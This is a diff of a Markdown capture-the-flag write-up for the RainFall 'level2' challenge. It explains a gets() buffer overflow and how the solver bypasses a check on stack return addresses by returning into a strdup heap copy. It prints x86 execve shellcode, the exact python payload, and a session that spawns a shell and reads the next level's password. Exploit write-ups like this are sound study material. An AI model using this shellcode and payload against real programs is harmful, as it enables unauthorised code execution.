@@ -1,5 +1,7 @@
 # level2
 
+## Initial analysis
+
 According to `file` :
 
 ```bash
@@ -63,16 +65,16 @@ level2:     file format elf32-i386
  804854f:       90                      nop
 ```
 
-Unlike *level2*, it does not have any existing code in the `.text` section to spawn a shell. In our exploit, we will have somehow to *add* additional code to spawn it. This is what we call a **shell code** : a small piece of code used as the payload in the exploitation of a software vulnerability.
+Unlike level2, this setup does not include any existing code in the .text section to spawn a shell. In our exploit, we must somehow inject additional code to achieve this. This is known as **shellcode** — a small piece of code used as the payload when exploiting a software vulnerability.
 
-In function `p`, the very unsafe `gets` get called again. Great, that is an wide open door for a **buffer overflow** : that means we can overwrite the return address of function `p` on the stack. But where should we return to ?
+In function `p`, the highly unsafe `gets` function is called once again. This is a serious vulnerability because it allows a **buffer overflow**, enabling us to overwrite the return address of function `p` on the stack. But where should we redirect execution?
 
-Remember when i talked about adding additional code. We can add this code in the initial buffer that `gets` uses, and modify the return address to point into our additional injected code that is located into the stack.
+Since we need to introduce additional code, we can inject it into the buffer used by `gets` and then modify the return address to point to our shellcode, which resides in the stack.
 
-But there may be a problem using this technique in this particular setup, take a look at this snippet of instructions:
+However, this approach have an issue in this particular setup. Consider the following snippet of instructions:
 
 ```
- 80484f2:       8b 45 04                mov    eax,DWORD PTR [ebp+0x4] <---
+ 80484f2:       8b 45 04                mov    eax,DWORD PTR [ebp+0x4]
  80484f5:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
  80484f8:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
  80484fb:       25 00 00 00 b0          and    eax,0xb0000000
@@ -80,7 +82,9 @@ But there may be a problem using this technique in this particular setup, take a
  8048505:       75 20                   jne    8048527 <p+0x53>
 ```
 
-It performs a check on the return address `ebp + 0x4` !  Basically, it checks if the most significant byte of the return address is `0xb`, which would mean that we manipulated it so it points on the stack. This would prevent us from correctly redirecting the execution flow into our shellcode. If this check doesn´t pass, we jump to `0x8048527` :
+The program performs a check on the return address located at `ebp + 0x4`. Specifically, it verifies whether the most significant byte of the return address is `0xb`. If it is, this indicates that we have manipulated the return address to point to the stack, which would prevent us from successfully redirecting execution to our shellcode.
+
+If the check fails, execution is redirected to `0x8048527`. This presents a challenge, as it blocks a straightforward return-to-shellcode approach. But we might have a solution :
 
 ```
  8048527:       8d 45 b4                lea    eax,[ebp-0x4c]
@@ -93,9 +97,11 @@ It performs a check on the return address `ebp + 0x4` !  Basically, it checks if
  804853e:       c3                      ret    
 ```
 
-It echoes back when we just wrote into the buffer, and then proceed to duplicate the stack-allocated buffer into an heap-allocated region. Interesting ! So instead of modifying our return address so it points on our buffer that is allocated into the stack, we could modify it so it points into the heap-allocated region instead ! It will contains exactly the same data as it is duplicated.
+The program first echoes back what we wrote into the buffer and then proceeds to duplicate the stack-allocated buffer into a heap-allocated region. This is an interesting behavior!
 
-The challenge here is that our shell code must not include any NUL byte (`0x00`), since it will end prematurely `strdup` (remember that a C strings are always nul-terminated).
+Instead of modifying the return address to point to our buffer in the stack — where execution is blocked by the "security check". We can redirect it to the heap-allocated region instead. Since the data is duplicated exactly, our shellcode will still be present in memory and ready for execution.
+
+The main challenge here is that our shellcode must not contain any **NUL bytes** (0x00), as `strdup` treats NUL as the end of the string. If our shellcode includes a NUL byte, it will be truncated prematurely, making it ineffective.
 
 ## Crafting the shellcode
 
@@ -122,7 +128,7 @@ _start:
     shell db "/bin/sh", 0
 ```
 
-This is a basic program that `execve` a shell. Note the trick to get the address of the string `/bin/sh` : at the beginning we immediately jump to a `call .ret`, which pushes the address of `/bin/sh` into the stack and jump to `pop ebx`, which pop the address of `/bin/sh` into the register `ebx`. This trick is used to dynamically get the address, since we do not know the exact address our shellcode will be injected.
+This is a basic program that `execve` a shell. Note the trick to get the address of the string `/bin/sh` : at the beginning we immediately jump to a `call .ret`, which pushes the address of `/bin/sh` into the stack and jump to `pop ebx`, which pop the address of `/bin/sh` into the register `ebx`. This trick is used to dynamically get the address, since somtimes we do not know the exact address our shellcode will be injected.
 Do note that we use the **relative** version of `jmp` and `call`, so we can indicate **offsets** instead of **absolute address**.
 
 We are using x86 calling conventions and `int 0x80` to trap into kernel mode for the syscall.
@@ -155,10 +161,10 @@ This shellcode doesn't lead to any `0x00` expect for the last byte. `strdup` wil
 These are the remaining steps :
 
   - Find how big the buffer is to know how many bytes we have to fill until overwriting the return address.
-  - Set the return address to the return address of `strdup`
+  - Set the return address to the return address of `strdup`.
   - Craft a python command to inject our **shellcode**, filling characters, and the new **return address**.
 
-Using GDB and the disassembly, we find out that the buffer starting address is located at `ebp - 0x4c` :
+Using **GDB** and the disassembly, we find out that the buffer starting address is located at `ebp - 0x4c` :
 
 ```
  80484e7:       8d 45 b4                lea    eax,[ebp-0x4c]
@@ -205,7 +211,7 @@ This leads to the following python command :
 python -c 'print("\xEB\x0B\x5B\x31\xC0\x89\xC1\x89\xC2\xB0\x0B\xCD\x80\xE8\xF0\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x00" + "a"*54 + "\x08\xa0\x04\x08")'
 ```
 
-We can then proceed to pwn this program :)
+We can then proceed to pwn this program. Notice the use `cat` again to prevent premature closing of the *standard input*.
 
 ```bash
 level2@RainFall:~$ (python -c 'print("\xEB\x0B\x5B\x31\xC0\x89\xC1\x89\xC2\xB0\x0B\xCD\x80\xE8\xF0\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x00" + "a"*54 + "\x08\xa0\x04\x08")'; cat) | ./level2 
@@ -218,3 +224,5 @@ cd ../level3
 cat .pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
+
+Success !
